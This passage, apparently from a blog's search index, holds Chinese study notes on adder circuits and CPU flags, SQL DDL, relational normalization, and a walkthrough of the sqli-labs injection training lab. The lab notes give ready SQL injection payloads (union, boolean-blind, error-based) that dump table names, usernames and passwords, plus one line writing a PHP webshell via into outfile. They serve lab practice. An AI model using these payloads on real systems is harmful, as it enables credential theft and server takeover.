串行进位的并行加法器\n\n串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的\n\n# 并行进位加法器\n以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。\n每个进位产生的逻辑表达式:Ci=AiBi+(Ai⨁Bi)Ci−1C_i = A_iB_i + (A_i \\bigoplus B_i )C_{i-1}Ci​=Ai​Bi​+(Ai​⨁Bi​)Ci−1​，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开\n\n\n这种加法器的设计每个位的进位几乎是同时产生的\n不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算\n# 补码加减运算器\n加法器原理\n\n补码加 / 减法运算\n\nn bit 补码 X+Y，按位相加即可\nn bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法\n\n\n无符号整数的加 / 减法也可以用该电路实现\n\n无符号数 X+Y，按位相加即可\n无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法\n\n补码加减运算和无符数的加减运算都可以用同一个运算器实现，但是溢出位的判断不同\n所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理\n# 标志位的生成\n\n加法器输出四个标志位的信息\n\nOF：溢出标志，只在有符号数的加减运算时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）\n\nOF 的硬件逻辑：OF = 最高位的进位异或次高位的进位\n在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的\n\nSF：符号标志，运算结果为正则置为 0，结果为负则置为 1\n\nSF 的硬件计算方法：SF = 最高位的本位和\nSF 位对无符号数的加减法无意义\n\nZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0\n\n对有符号数和无符号数都有意义\n\nCF：进位 / 错位标志，进位 / 错位时置 1，否则置 0\n\nCF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义\n\n\n\n产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出\n\n有符号整数加减运算是否产生了溢出要看 OF 位，无符号整数加减运算是否产生溢出要看 CF 位\n","slug":"计算机组成原理-数据的表示和运算","date":"2022-06-11T03:21:41.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"6b01e0a1bee5e460cbe53bebb203270e","title":"数据库-关系数据库标准语言SQL","content":"# 3.3 数据定义\n# 3.3.1 模式的定义与删除\n# 1. 定义模式\ncreate schema &lt;模式名> authorization &lt;用户名>\n例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T\ncreate schema \"S-T\" authorization WANG;\n# 2. 删除模式\ndrop schema &lt;模式名> &lt;cascade|restrict>\n# 3.3.2 基本表的定义、删除与修改\n# 1. 定义基本表\n例 3.5：建立一个学生表 Student\ncreate table student(\n    sco char(9) primary key,\n    sname char(20) unique,\n    ssex char(2),\n    sage smallint,\n    sdept char(20)\n);\n# 2. 数据类型\n# 3. 模式与表\n# 4. 修改基本表\n例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型\nalter table Student add S_entrance DATE;\n例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数\nalter table Student alter column Sage INT;\n例 3.10：增加课程名称必须取唯一值的约束条件\nalter table Student add unique(Cname);\n# 5. 删除基本表\n例 3.11：删除 Student 表\ndrop table Student cascade;\n# 3.3.3 索引的建立与删除\n# 1. 建立索引\n在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：\nCREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])\n例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。\ncreate unique index stusno on student(Sno);\nCREATE UNIQUE INDEX Coucno ON Course(Cno);\nCREATE UNIQUE INDEX SCno ON SC(Sno ASC, Cno DESC);\n# 2. 修改索引\n例 3.14：将 SC 表的 SCno 索引名改为 SCSno\nALTER INDEX SCno RENAME TO SCSno;\n# 3. 删除索引\nDROP INDEX Stusname;\n# 3.4 数据查询\n","slug":"数据库-关系数据库标准语言SQL","date":"2022-06-09T11:13:01.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"7c1208209b9fd71ae4c371be24b134d7","title":"数据库-关系数据理论","content":"# 6.1 问题的提出\nR(U,D,DOM,F)：\n\n关系明 R 是符号化的元组语义\nU 为一组属性\nD 为属性组 U 中的属性所来自的域\nDOM 为属性到域的映射\nF 为属性组 U 上的一组数据依赖\n\n第一范式：每一个分量必须是不可分割的数据项\n数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是函数依赖和多值依赖。\n函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有Sname=f(sno)Sname = f(sno)Sname=f(sno)，Sdept=f(Sno)Sdept = f(Sno)Sdept=f(Sno)，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作Sno→SnameSno \\rightarrow SnameSno→Sname。\n一个学生例子：F=\\\n但是这个关系存在以下的问题：\n\n数据冗余\n\n如一个系的系主任名重复出现\n\n\n更新异常\n插入异常\n删除异常\n\n将这个单一的模式改造如下，分成三个关系模式：\n\nS(Sno,Sdept,Sno→Sdept)S(Sno,Sdept,Sno \\rightarrow Sdept )S(Sno,Sdept,Sno→Sdept)\nSC(Sno,Cno,Grade,(Sno,Cno)→Grade)SC(Sno,Cno,Grade,(Sno,Cno) \\rightarrow Grade)SC(Sno,Cno,Grade,(Sno,Cno)→Grade)\nDEPT(Sdept,Mname,Sdept→Mname)DEPT(Sdept,Mname,Sdept \\rightarrow Mname)DEPT(Sdept,Mname,Sdept→Mname)\n\n# 6.2 规范化\n通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。\n# 6.2.1 函数依赖\n定义 6.1：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作X→YX \\rightarrow YX→Y。\n函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名→\\rightarrow→ 年龄这个函数依赖只有在该部门没有同名人的条件下成立。\n下面介绍一些术语和记号：\n\nX→YX \\rightarrow YX→Y，但 Y 不属于 X，则称X→YX \\rightarrow YX→Y 是非平凡的函数依赖。\nX→YX \\rightarrow YX→Y，但 Y 属于 X，则称X→YX \\rightarrow YX→Y 是平凡的函数依赖。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。\n若X→YX \\rightarrow YX→Y，则称 X 为这个函数依赖的决定属性组，也称为决定因素。\n若X→YX \\rightarrow YX→Y，Y→XY \\rightarrow XY→X，则记作X←→YX \\leftarrow \\rightarrow YX←→Y。\n若 Y 不函数依赖于 X，则记作X→YX \\rightarrow YX→Y，箭头加斜线\n\n定义 6.2：在 R (U) 中，如果X→YX \\rightarrow YX→Y，并且对于 X 的任何一个真子集X′X&#x27;X′，都有X′X&#x27;X′ 不函数依赖于YYY，则称 Y 对 X 完全函数依赖，记作 —&gt;F\n定义 6.3：传递函数依赖\n# 6.2.2 码\n码是关系模式中的一个重要概念。\n定义 6.4：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的候选码。\n注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，如果 U 函数依赖于 K，即K→UK \\rightarrow UK→U，则 K 称为超码。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。\n若候选码多于一个，则选定其中的一个为主码。\n包含在任何一个候选码中的属性称为主属性；不包含在任何候选码中的属性称为非主属性或非码属性。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为全码。\n定义 6.5：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码，也称外码。\n# 6.2.3 范式\n关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。\n一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫规范化。\n# 6.2.4 2NF\n定义 6.6：若R∈1NFR\\in 1NFR∈1NF，且每一个非主属性完全函数依赖于任何一个候选码，则R∈2NFR\\in 2NFR∈2NF。\n# 6.3 数据依赖的公理系统\n定义 6.11：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖X→YX \\rightarrow YX→Y 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称 F 逻辑蕴含X→YX \\rightarrow YX→Y.\n公理系统设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：\n\nA1 自反律\nA2 增广率\nA3 传递率\n\n定义 6.13：设 F 为属性集 U 上的一组函数依赖，X、Y⊆\\subseteq⊆U，XF+={A∣X→A能由F根据Armstrong公理导出}X^+_{F}=\\{A|X \\rightarrow A 能由F根据Armstrong 公理导出\\}XF+​={A∣X→A能由F根据Armstrong公理导出}，XF+X^+_FXF+​ 称为属性集 X 关于函数依赖集 F 的闭包。\n","slug":"数据库-关系数据理论","date":"2022-06-08T13:12:23.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"1b32940dd409c0fe09232e5ee728ee0b","title":"sqli-labs笔记","content":"测试上线使用\n注意点：PHP 要使用低版本，高版本无法安装\thttps://github.com/Audi-1/sqli-labs\n# 相关知识点\n\n\n\n\n\n\n\n\n\n信息收集知识点：\n数据库版本：version ()\t 5.7.22-0ubuntu0.16.04.1\n数据库用户：user ()\t\t root@localhost\n数据库名字：database ()\t mozhe_Discuz_StormGroup\n操作系统：@@version_compile_os\t Linux\n版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）\n\n\n\n\n\n\n\n\n\n读写文件操作 (mysql 特有功能)\nload_file (): 文件读取函数\ninto outfile 或 into dumpfile：导出函数\n使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加\n# less 01\n\n经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;\n\n\n\n但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题\n\n\n\n判断出字段共有三列，判断回显位置\n\n\n\n查询数据库和当前用户名\n\n\n\n以下为 payload，依次使用即可\n\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = \"security\"--+ #爆破表名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #爆破列名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据\n\n# less 02\n\nless 02 经测试为无引号包裹\n\n\n\n测试字段数\n\n\n\n信息收集\n\n\n\npayload\n\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"#  #获取表名\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"# #获取字段\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据\n\n# less 03\n\n判断闭合方式为双引号\n\n\n\n确定字段数时出现问题，发现后面有一个括号\n\n\n\n经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   ?id=1') order by 4-+\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = \"security\"--+ #查表\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #获取字段名\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据\n\n# less 04\n\n测试注入点，发现这里还是有一个括号干扰\n\n\n\n最终发现注入点的 payload 为： http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+\n\n\n\n判断字段数\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"--+ #获取表名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"--+ #获取列名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据\n\n# less 05\n# 1、布尔盲注 —— 使用 left 进行尝试\n\n利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+\n\n\n使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n\n\n使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)=\"s\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)=\"se\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>\"se\"--+ #使用ascii的值对字符进行判断\n\n# 2、报错注入\n\npayload 如下，使用 updatexml 函数\n\n#获取当前数据库名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n#获取当前数据库所有表名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有列名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有username和password的值\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+\n#下面这步写webshell\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+\n \n\n本关为无回显注入\n\n\n\n判断闭合方式为单引号\n\n\n\n获取数据库\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+\n\n\n获取表名\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+\n\n\n获取字段名\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+\n\n\n获取数据\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\n#1依次加31即可\n\n","slug":"sqli-labs笔记","date":"2022-06-07T06:44:48.000Z","categories_index":"web安全","tags_index":"web安全,测试","author_index":"cCor4ng3"}]